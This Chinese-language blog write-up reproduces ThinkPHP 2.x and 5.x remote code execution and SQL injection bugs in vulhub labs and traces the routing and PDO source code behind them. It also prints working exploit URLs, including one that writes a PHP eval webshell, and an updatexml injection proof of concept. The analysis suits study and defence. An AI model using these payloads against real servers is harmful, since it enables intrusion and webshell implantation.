写在前面：最近在学习框架漏洞的知识，也是从vulhub上进行搭建，之后进行复现，参考了很多大佬的博客文章，供大家学习。

## 0.ThinkPHP

####  **1)简介**

ThinkPHP是一个免费开源的，快速的，简单的面向对象的国产轻量级PHP开发框架。

ThinkPHP遵循Apache2开源协议发布，是为了敏捷WEB应用开发和简化企业级应用开而诞生的，具有免费开源，快速简单及面向对象等众多的优秀功能和特性。ThinkPHP经历了五年多发展的同时，在社区团队的积极参与下，在易用性，扩展性和性能方面不断优化和改进，众多的典型案例确保可以稳定用于商业以及门户的开发。

ThinkPHP借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，采用单一入口模式等。融合了Struts的Action思想和JSP的TagLib（标签库），ROR的ORM映射和ActiveRecord模式；封装了CURD和一些常用操作，在项目配置，类库导入，模板引擎，查询语言，自动验证，视图模型，项目编译，缓存机制，SEO支持，分布式数据库，多数据库连接和切换，认证机制和扩展性方面均有独特的表现。

使用ThinkPHP，可以更方便和快捷的开发和部署应用。ThinkPHP本身具有很多的原创特性，并且倡导大道至简，开发由我的开发理念，用最少的代码完成更多的功能，宗旨就是让WEB应用开发更简单，更快速!

#### 2）安装方法

 **下载ThinkPHP后解压完成会形成两个文件夹：ThinkPHP和Examples。**

 **ThinkPHP无需单独安装，将ThinkPHP文件夹FTP至服务器Web目录或拷贝至本地Web目录下面即可。**

#### 3） **ThinkPHP目录结构说明**

> ThinkPHP.php：框架入口文件
>
> Common：包含框架的一些公共文件，系统定义，系统函数和惯例配置等
>
> Conf：框架配置文件目录
>
> Lang：系统语言文件目录
>
> Lib：系统基类库目录
>
> Tpl：系统模板目录
>
> Extend：框架扩展s

#### 4）ThinkPHP运行环境要求

ThinkPHP可以支持Windows/Unix服务器环境，可以运行包括Apache，IIS和nginx在内的多种WEB服务器和多种模式。需要PHP5.2.0以上版本支持，支持MYSQL,MSSQL,PGSQL,SQLITE,ORACLE,LBASE以及PDo等多种数据库和连接。

ThinkPHP本身没有什么特别模块要求，具体的应用系统运行环境要求视开发所涉及的模块。ThinkPHP底层运行的内存消耗极低，而本身的文件大小也是轻量级，因此不会出现空间和内存占用的瓶颈。

## 一.2-rce

###  **0x01 提前了解知识**

####  _ **preg_replace函数:**_

​ preg_replace( mixed $pattern , mixed $replacement , mixed $subject [, int
$limit = - 1 [ , int &$count ]])

###### 搜索subject中匹配pattern的部分，以replacement进行替换。

> $pattern:要搜索的模式，可以是字符串或者一个字符串数组
>
> $replacement:用于替换的字符串或者数组
>
> $subject:用于替换的目标字符串或者数组
>
> $limit:可选,对于每个模式用于每个subject字符串的最大可替换数。默认是-1
>
> $count:可选·，为替换执行的次数

 **返回值:**

​ 如果subject为一个数组，则返回一个数组，其他情况下返回一个字符串。

​ 如果匹配被查找到，替换后的subject被返回，其他情况下，返回没有改变的 subject，如果发生错误返回NULL

正则表达式：https://www.runoob.com/regexp/regexp-syntax.html

### 0x02 实验步骤

访问页面，发现是一个Thinkphp的cms框架，由于是漏洞复现，我们很清楚的知道他的版本是 **2.x**
。如果不知道版本的可以通过乱输入径进行报错，或是使用云悉指纹识别进行检测

![image-20211112210315092](https://image.3001.net/images/20211115/1636964517_619218a52bd15c2ef6648.png!small)

此时输入已经爆出的远程代码执行命令即可浮现漏洞:

    
    
    /index.php?s=/index/index/xxx/${@phpinfo()}   //phpinfo敏感文件
    /index.php?s=a/b/c/${@print(eval($_POST[1]))}  //此为一句话连菜刀
    

![image-20211112210324862](https://image.3001.net/images/20211115/1636964518_619218a63cf0404762ef7.png!small)

这里只要将phpinfo()换成一句话木马即可成功!

### 0x03 实验原理

1）通过观察这句话，我们可以清楚的知道它是将

    
    
    ${@phpinfo()}
    

作为变量输出到了页面显示，其原理，我通过freebuf总结一下:

> 在PHP当中， ${} 是可以构造一个变量的， {} 写的是一般字符，那么就会被当作成变量，比如 ${a} 等价于 $a
>
> thinkphp所有的主入口文件默认访问index控制器(模块)
>
> thinkphp所有的控制器默认执行index动作(方法)
    
    
    http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]
    

数组$var在路径存在模块和动作时，会去除前面两个值。而数组$var来自于explode($depr,trim($_SERVER['PATH_INFO'],'/'));也就是路径。

所以我们构造poc如下:

    
    
    /index.php?s=a/b/c/${phpinfo()}
    /index.php?s=a/b/c/${phpinfo()}/c/d/e/f
    /index.php?s=a/b/c/d/e/${phpinfo()}.......
    

2）换而言之，就是在thinphp的类似于MVC的框架中，存在一个 **Dispatcher.class.php**
的文件，它规定了如何解析路由，在该文件中，存在一个函数为 **static public function dispatch()**
，此为URL映射控制器，是为了将URL访问的路径映射到该控制器下获取资源的，而当我们输入的URL作为变量传入时，该URL映射控制器会将变量以数组的方式获取出来，从而导致漏洞的产生。

    
    
    类名为`Dispatcher`，class Dispatcher extends Think
    里面的方法有:
    static public function dispatch() URL映射到控制器
    public static function getPathInfo()  获得服务器的PATH_INFO信息
    static public function routerCheck() 路由检测
    static private function parseUrl($route)
    static private function getModule($var) 获得实际的模块名称
    static private function getGroup($var) 获得实际的分组名称
    

## 二.5.0.23-rce

### 漏洞简介

ThinkPHP 5.x主要分为 5.0.x和5.1.x两个系列，系列不同，复现漏洞时也稍有不同。

在ThinkPHP 5.x中造成rce(远程命令执行)有两种原因

1.路由对于控制器名控制不严谨导致RCE、

2.Request类对于调用方法控制不严谨加上变量覆盖导致RCE

首先记录这两个主要POC:

 **控制器名未过滤导致rce**

function为反射调用的函数，vars[0]为传入的回调函数，vars[1][]为参数为回调函数的参数

?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

 **核心类Request远程代码执行漏洞**

filter[]为回调函数，get[]或route[]或server[REQUEST_METHOD]为回调函数的参数，执行回调函数的函数为call_user_func()

核心版需要开启debug模式

​ POST /index.php？s=captch

​ _ method=_ construct&filter[]=system&method=get&server[REQUEST_METHOD]=pwd

or

​ _ method=_construct&method=get&filter[]=system&get[]=pwd

###  **控制器名未过滤导致RCE**

####  **0x01 简介**

2018年12月9日，ThinkPHP
v5系列发布安全更新v5.0.23，修复了一处可导致远程代码执行的严重漏洞。在官方公布了修复记录后，才出现的漏洞利用方式，不过不排除很早之前已经有人使用了0day

该漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而让攻击者可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞

最终确定漏洞影响版本为：

ThinkPHP 5.0.5-5.0.22

ThinkPHP 5.1.0-5.1.30

理解该漏洞的关键在于理解ThinkPHP5的路由处理方式主要分为有配置路由和未配置路由的情况，在未配置路由的情况，ThinkPHP5将通过下面格式进行解析URL

    
    
    http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]
    

同时在兼容模式下ThinkPHP还支持以下格式解析URL：

    
    
    http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]		（参数以PATH_INFO传入）
    http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[&参数名=参数值...]	     （参数以传统方式传入）
    eg:
    http://tp5.com:8088/index.php?s=user/Manager/add&n=2&m=7
    http://tp5.com:8088/index.php?s=user/Manager/add/n/2/m/8
    

本次漏洞就产生在 **未匹配** 到路由的情况下，使用兼容模式解析url时，通过构造特殊url，调用意外的控制器中敏感函数，从而执行敏感操作

下面通过代码具体解析ThinkPHP的路由解析流程

###  **0x02 路由处理逻辑详细分析**

分析版本: 5.0.22

跟踪路由处理的逻辑，来完整看一下该漏洞的整体调用链:

​ thinkphp/library/think/App.php

116行，通过routeCheck()方法开始进行url路由检测

在routeCheck()中，首先提取$path信息，这里获取$path的方式分别为pathinfo模式和兼容模式，pathinfo模式就是通过$_SERVER['PATH_INFO']获取到的主要path信息，==`$_SERVER['PATH_INFO']`会自动将URL中的""替换为"/",导致破坏命名空间格式==，==兼容模式下==`$_SERVER['PATH_INFO']`=$_GET[Config::get('var_pathinfo')];，path的信息会通过get的方式获取，var_pathinfo的值默认为's'，从而绕过了反斜杠的替换==，这里也是该漏洞的一个关键利用点

检测逻辑：如果开启了路由检测模式(配置文件中的url_on为true)，则进入路由检测，结果返回给$result，如果路由无效且设置了只允许路由检测模式(配置文件url_route_must为true)，则抛出异常。

在兼容模式中，检测到路由无效后(false ===
$result),则还会进入Route::parseUrl()检测路由。我们重点关注这个路由解析方式，因为该方式我们通过URL可控:

放回最终的路由检测结果$result($dispath),交给exec执行:

    
    
    $dispatch = self::routeCheck($request, $config);									//line:116
    $data = self::exec($dispatch, $config);														//line:139
    public static function routeCheck($request, array $config)				//line:624-658
    	{
            $path   = $request->path();
            $depr   = $config['pathinfo_depr'];
            $result = false;
    
            // 路由检测
            $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
            if ($check) {
                // 开启路由
                ……
                // 路由检测（根据路由定义返回不同的URL调度）
                $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
                $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];
                if ($must && false === $result) {
                    // 路由无效
                    throw new RouteNotFoundException();
                }
            }
            // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
            if (false === $result) {
                $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
            }
            return $result;
        }
    

thinkphp/libary/think/Route.php

跟踪Route::parseUrl(),在注释中可以看到大概解析方式

$url主要同通过parseUrlPath()解析，跟踪该函数发现程序通过斜杠/来划分模块/控制器/操作，结果为数组形式，然后将他们封装为$route,最终返回['type'=>'moudle','moudle'=>$route]数组，作为App.php中$dispatch1值，并传入exec()函数中

注意这里使用的时 斜杠/来划分每个部分，我们的控制器可以通过命名空间来调用，命名空间使用反斜杠\来划分，正好错过，这也是能利用的其中一个细节

    
    
    /**
         * 解析模块的URL地址 [模块/控制器/操作?]参数1=值1&参数2=值2...
         * @access public
         * @param string $url        URL地址
         * @param string $depr       URL分隔符
         * @param bool   $autoSearch 是否自动深度搜索控制器
         * @return array
    */
    public static function parseUrl($url, $depr = '/', $autoSearch = false)		//line:1217-1276
        {
            $url              = str_replace($depr, '|', $url);
            list($path, $var) = self::parseUrlPath($url);  //解析URL的pathinfo参数和变量
            $route            = [null, null, null];
            if (isset($path)) {
                // 解析模块，依次得到$module, $controller, $action
              	……
              	// 封装路由
                $route = [$module, $controller, $action];
            }
            return ['type' => 'module', 'module' => $route];
        }
    

thinkphp/library/think/Route.php

    
    
    private static function parseUrlPath($url)				//line:1284-1302
        {
            // 分隔符替换 确保路由定义使用统一的分隔符
            $url = str_replace('|', '/', $url);
            $url = trim($url, '/');
            $var = [];
            if (false !== strpos($url, '?')) {
                // [模块/控制器/操作?]参数1=值1&参数2=值2...
                $info = parse_url($url);
                $path = explode('/', $info['path']);
                parse_str($info['query'], $var);
            } elseif (strpos($url, '/')) {
                // [模块/控制器/操作]
                $path = explode('/', $url);
            } else {
                $path = [$url];
            }
            return [$path, $var];
        }
    

路由解析结果作为exec()的参数进行执行，追踪该函数

> thinkphp/library/think/App.php

追踪`exec()`函数，传入了$dispatch，$config两个参数，其中$dispatch为`['type' => 'module',
'module' => $route]`

因为 type 为
module，直接进入对应流程，然后执行`module`方法，其中传入的参数`$dispatch['module']`为模块\控制器\操作组成的数组

跟踪`module()`方法，主要通过`$dispatch['module']`获取模块$module, 控制器$controller,
操作$action，可以看到==提取过程中除了做小写转换，没有做其他过滤操作==

`$controller`将通过`Loader::controller`自动加载，这是ThinkPHP的自动加载机制，只用知道此步会加载我们需要的控制器代码，如果控制器不存在会抛出异常，加载成功会返回`$instance`，这应该就是控制器类的实例化对象，里面保存的有控制器的文件路径，命名空间等信息

通过`is_callable([$instance, $action])`方法判断`$action`是否是`$instance`中可调用的方法

通过判断后，会记录$instacne,$action到$call中（`$call = [$instance,
$action]`），方便后续调用，并更新当前`$request`对象的action

最后`$call`将被传入`self::invokeMethod($call, $vars)`

    
    
    protected static function exec($dispatch, $config)	//line:445-483
        {
            switch ($dispatch['type']) {
    						……
                case 'module': // 模块/控制器/操作
                    $data = self::module(
                        $dispatch['module'],
                        $config,
                        isset($dispatch['convert']) ? $dispatch['convert'] : null
                    );
                    break;
                ……
                default:
                    throw new \InvalidArgumentException('dispatch type not support');
            }
    
            return $data;
        }
    
    public static function module($result, $config, $convert = null)		//line:494-608
        {
            ……
    
            if ($config['app_multi_module']) {
                // 多模块部署
              	// 获取模块名
                $module    = strip_tags(strtolower($result[0] ?: $config['default_module']));
    						……
            }
    				……
    
            // 获取控制器名
            $controller = strip_tags($result[1] ?: $config['default_controller']);
            $controller = $convert ? strtolower($controller) : $controller;
    
            // 获取操作名
            $actionName = strip_tags($result[2] ?: $config['default_action']);
            if (!empty($config['action_convert'])) {
                $actionName = Loader::parseName($actionName, 1);
            } else {
                $actionName = $convert ? strtolower($actionName) : $actionName;
            }
    
            // 设置当前请求的控制器、操作
            $request->controller(Loader::parseName($controller, 1))->action($actionName);
          	……
            try {
                $instance = Loader::controller(
                    $controller,
                    $config['url_controller_layer'],
                    $config['controller_suffix'],
                    $config['empty_controller']
                );
            } catch (ClassNotFoundException $e) {
                throw new HttpException(404, 'controller not exists:' . $e->getClass());
            }
    
            // 获取当前操作名
            $action = $actionName . $config['action_suffix'];
    
            $vars = [];
            if (is_callable([$instance, $action])) {
                // 执行操作方法
                $call = [$instance, $action];
                // 严格获取当前操作方法名
                $reflect    = new \ReflectionMethod($instance, $action);
                $methodName = $reflect->getName();
                $suffix     = $config['action_suffix'];
                $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;
                $request->action($actionName);
    
            } elseif (is_callable([$instance, '_empty'])) {
                // 空操作
                $call = [$instance, '_empty'];
                $vars = [$actionName];
            } else {
                // 操作不存在
                throw new HttpException(404, 'method not exists:' . get_class($instance) . '->' . $action . '()');
            }
    
            Hook::listen('action_begin', $call);
    
            return self::invokeMethod($call, $vars);
        }
    

先提前看下5.0.23的修复情况，找到对应的commit，对传入的控制器名做了限制

![image-20211112210342027](https://image.3001.net/images/20211115/1636964519_619218a77d8a785544180.png!small)

thinkphp/library/think/App.php

跟踪`invokeMethod`，其中 $method = $call = [$instance, $action]

通过实例化反射对象控制$instace的$action方法，即控制器类中操作方法

中间还有一个绑定参数的操作

最后利用反射执行对应的操作

    
    
    public static function invokeMethod($method, $vars = [])
        {
            if (is_array($method)) {
                $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
                $reflect = new \ReflectionMethod($class, $method[1]);
            } else {
                // 静态方法
                $reflect = new \ReflectionMethod($method);
            }
    
            $args = self::bindParams($reflect, $vars);
    
            self::$debug && Log::record('[ RUN ] ' . $reflect->class . '->' . $reflect->name . '[ ' . $reflect->getFileName() . ' ]', 'info');
    
            return $reflect->invokeArgs(isset($class) ? $class : null, $args);
        }
    

以上便是ThinkPHP5.0完整的路由检测，

### 0x03 弱点利用

如上我们知道，url 路由检测过程并没有对输入有过滤，我们也知道通过url构造的 **模块/控制器/操作**
主要来调用对应模块->对应的类->对应的方法，而这些参数通过url可控，我们便有可能操控程序中的所有控制器的代码，接下来的任务便是寻找敏感的操作

> thinkphp/library/think/App.php
    
    
    public static function invokeFunction($function, $vars = [])			//line:311-320
        {
            $reflect = new \ReflectionFunction($function);
            $args    = self::bindParams($reflect, $vars);
    
            // 记录执行信息
            self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');
    
            return $reflect->invokeArgs($args);
        }
    

该函数通过`ReflectionFunction()`反射调用程序中的函数，这就是一个很好利用的点，我们通过该函数可以调用系统中的各种敏感函数。

找到利用点了，现在就需要来构造poc，首先触发点在`thinkphp/library/think/App.php`中的`invokeFunction`，我们需要构造url格式为`模块\控制器\操作`

模块我们用默认模块`index`即可，首先大多数网站都有这个模块，而且每个模块都会加载`app.php`文件，无须担心模块的选择

该文件的命名空间为`think`，类名为`app`，我们的控制器便可以构造成`\think\app`。因为ThinkPHP使用的自动加载机制会识别命名空间，这么构造是没有问题的。

操作直接为`invokeFunction`，没有疑问

参数方面，我们首先要触发第一个调用函数，简化一下代码再分析一下:

第一行确定 $class 就是我们传入的控制器`\think\app`实例化后的对象

第二行绑定我们的方法，也就是invokefunction

第三方就可以调用这个方法了，其中$args是我们的参数，通过url构造，将会传入到invokefunction中

    
    
    $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
    $reflect = new \ReflectionMethod($class, $method[1]);
    return $reflect->invokeArgs(isset($class) ? $class : null, $args);
    

然后就进入我们的invokefunctio，该函数需要什么参数，我们就构造什么参数，首先构造一个调用函数function=call_user_func_array

call_user_func_array需要两个参数，第一个参数为函数名，第二个参数为数组，`var[0]=system,var[1][0]=id`

这里因为两次反射一次回调调用需要好好捋一捋。。。。

![image-20211020213342613](https://image.3001.net/images/20211115/1636964520_619218a8d521a101a1462.png!small)

复现成功

![image-20211020213358706](https://image.3001.net/images/20211115/1636964522_619218aa5cf68e11d0132.png!small)

## 三.5-rce

### 0x01 漏洞原理

​
ThinkPHP是一款运用极广的PHP开发框架，其版本5中，由于没有使用正确的控制器名，导致在网站没有开启强制路由的情况下(即默认情况下)，可以执行任意方法，从而导致远程命令执行漏洞。

### 0x02 漏洞影响版本

ThinkPHP 5.0.5-5.0.22

ThinkPHP 5.1.0-5.1.30

### 0x03 漏洞复现

可以利用点:

>
> http://192.168.71.141:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

![image-20211112210424423](https://image.3001.net/images/20211115/1636964523_619218abddd54a0cf2330.png!small)

vars[0]用来接受函数名，vars[1][]用来接收参数

>
> 如:index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=%27123%27

![image-20211112210540522](https://image.3001.net/images/20211115/1636964525_619218ad2053024393107.png!small)

会在屏幕上打出123和我们输入的字符串长度

写入一句话木马getshell

使用file_put_contents函数写入shell:

    
    
    vars[0]=system&vars[1][]=echo%20"<?php%20@eval(\$_POST[1]);%20?>">>test.php
    

![image-20211112210435174](https://image.3001.net/images/20211115/1636964526_619218ae2fd92b11d4bae.png!small)

使用蚁剑成功getshell！

## 四.In-sqlinjection-rce

### 0x01 了解的知识:

pdo预编译:

当我们使用mysql语句进行数据查询时，数据首先传入计算机，计算机进行编译之后传入数据库进行数据查询

>
> **(我们使用的是高级语言，计算机无法直接理解执行，所以我们将命令或请求传入计算机时，计算机首先将我们的语句编译成为计算机语言，之后再进行执行，所以如果不编译直接执行计算机是无法理解的，如传入select函数，没编译之前计算机只认为这是五个字符，而无法理解这是个查询函数)**

如此说来，我们每次查询时都需要先编译，这样会加大成本，并且会存在sql注入的可能，所以有一定危险。

如此，我们进行查询数据库数据时使用预编译，例如:

> select ? from security where tables=?

此语句中?代表占位符，在pdo中表示之后绑定的数据，此时无法确定具体值

用户在传入查询具体数值时，计算机首先将以上的查询语句进行编译，使其具有执行力，之后再对于?代表的具体数值就不进行编译而直接进行查询，所以我们在?处利用sql注入语句代替时，就不具有任何效力，甚至传入字符串时还会报错，
**而预编译还可以节省成本**
，即上面语句除了查询数值只编译一次，之后进行相同语句查询时直接使用，只是查询具体数值改变。所以这种预编译的方式可以很好的防止sql注入。

漏洞上下文如下：

    
    
    <?php
    namespace app\index\controller;
    use app\index\model\User;
    class Index
    {
        public function index()
        {
            $ids = input('ids/a');
            $t = new User();
            $result = $t->where('id', 'in', $ids)->select();
        }
    }
    

如上述代码，如果我们控制了in语句的值位置，即可通过传入一个数组，来造成SQL注入漏洞。

文中已有分析，我就不多说了，但说一下为什么这是一个SQL注入漏洞。IN操作代码如下：

    
    
    <?php
    ...
    $bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);
    if (preg_match('/\W/', $bindName)) {
        // 处理带非单词字符的字段名
        $bindName = md5($bindName);
    }
    ...
    } elseif (in_array($exp, ['NOT IN', 'IN'])) {
        // IN 查询
        if ($value instanceof \Closure) {
            $whereStr .= $key . ' ' . $exp . ' ' . $this->parseClosure($value);
        } else {
            $value = is_array($value) ? $value : explode(',', $value);
            if (array_key_exists($field, $binds)) {
                $bind  = [];
                $array = [];
                foreach ($value as $k => $v) {
                    if ($this->query->isBind($bindName . '_in_' . $k)) {
                        $bindKey = $bindName . '_in_' . uniqid() . '_' . $k;
                    } else {
                        $bindKey = $bindName . '_in_' . $k;
                    }
                    $bind[$bindKey] = [$v, $bindType];
                    $array[]        = ':' . $bindKey;
                }
                $this->query->bind($bind);
                $zone = implode(',', $array);
            } else {
                $zone = implode(',', $this->parseValue($value, $field));
            }
            $whereStr .= $key . ' ' . $exp . ' (' . (empty($zone) ? "''" : $zone) . ')';
        }
    

可见，`$bindName`在前边进行了一次检测，正常来说是不会出现漏洞的。但如果`$value`是一个数组的情况下，这里会遍历`$value`，并将`$k`拼接进`$bindName`。

也就是说，我们控制了预编译SQL语句中的键名，也就说我们控制了预编译的SQL语句，这理论上是一个SQL注入漏洞。那么，为什么原文中说测试SQL注入失败呢？

这就是涉及到预编译的执行过程了。通常，PDO预编译执行过程分三步：

> `prepare($SQL)`编译SQL语句
>
> `bindValue($param, $value)`将value绑定到param的位置上
>
> `execute()`执行

这个漏洞实际上就是控制了第二步的`$param`变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的：

![image-20211112210452034](https://image.3001.net/images/20211115/1636964527_619218afaba695f635dce.png!small)

所以，这个错误“似乎”导致整个过程执行不到第三步，也就没法进行注入了。

但实际上，在预编译的时候，也就是第一步即可利用。我们可以做有一个实验。编写如下代码：

    
    
    <?php
    $params = [
        PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_EMULATE_PREPARES  => false,
    ];
    
    $db = new PDO('mysql:dbname=cat;host=127.0.0.1;', 'root', 'root', $params);
    
    try {
        $link = $db->prepare('SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))');
    } catch (\PDOException $e) {
        var_dump($e);
    }
    

执行发现，虽然我只调用了prepare函数，但原SQL语句中的报错已经成功执行：

[![image-20211112210502601](https://image.3001.net/images/20211115/1636964529_619218b134888fcd3e4c7.png!small)

究其原因，是因为我这里设置了`PDO::ATTR_EMULATE_PREPARES => false`。

这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后`execute()`的时候才发送给数据库执行；如果我这里设置了`PDO::ATTR_EMULATE_PREPARES
=> false`，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。

非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing->resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization->execution）。

这时，假设在第一步执行`prepare($SQL)`的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。我们看看ThinkPHP5的默认配置：

    
    
    ...
    // PDO连接参数
    protected $params = [
        PDO::ATTR_CASE              => PDO::CASE_NATURAL,
        PDO::ATTR_ERRMODE           => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_ORACLE_NULLS      => PDO::NULL_NATURAL,
        PDO::ATTR_STRINGIFY_FETCHES => false,
        PDO::ATTR_EMULATE_PREPARES  => false,
    ];
    ...
    

可见，这里的确设置了`PDO::ATTR_EMULATE_PREPARES =>
false`。所以，终上所述，我构造如下POC，即可利用报错注入，获取user()信息：

http://localhost/thinkphp5/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1231

![image-20211112210513080](https://image.3001.net/images/20211115/1636964530_619218b2938a712ac8136.png!small)

但是，如果你将user()改成一个子查询语句，那么结果又会爆出`Invalid parameter number: parameter was not
defined`的错误。因为没有过多研究，说一下我猜测：预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的
，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。

# 个人总结

​
其实ThinkPH框架漏洞大多用到的都是设置对于控制器名的一个疏忽问题，不理解的小伙伴可以查来url调用文件的机制来学习一下，其实这些框架漏洞都是基于基础漏洞的一些拓展，至于sql漏洞，了解一下pdo预编译原理即可。

​ 不管java或是php在进行数据库查询的时候都应该进行pdo预编译，我们都知道，在jdbc工作的时候分成好多步

> 1.建立连接
>
> 2.写入sql语句
>
> 3.预编译sql语句
>
> 4.设置参数
>
> 5.执行sql获取结果
>
> 6.遍历结果(处理结果)
>
> 7.关闭连接

​
对于程序员来说，jdbc操作总是很麻烦，所以利用预编译就是将mysql查询语句进行封装，之后在进行查询的时候直接输入参数即可，这样即简化了操作也极大程度加强了安全属性，而以此类推，这样来说我们是否可以将其他步骤也进行封装呢，也就是建立连接，写入sql语句等，只留下写入sql语句与遍历结果来进行操作，这样就更加简化了操作。

于是就诞生出了Mybatis半自动框架与Hibernate全自动框架，直接将jdbc的操作进行封装，但是由于全自动框架可操作性过于狭窄，所以现在市面上更多的还是Mybatis框架进行连接服务端与数据库，但是一般政府或国企的项目还是偏向于Hibernate框架，这些知识都是涉及一些编程知识，大家可以自己去了解一下。

还撰写过一篇关于servlet的总结，是关于[连接网页与客户端的一些知识](https://www.freebuf.com/articles/web/304657.html)，也描述了一些关于Cookie与session或页面信息的基础知识，对于网络安全学习还是大有裨益的，感兴趣的小伙伴可以去看看。链接奉上！欢迎各位大佬光临。

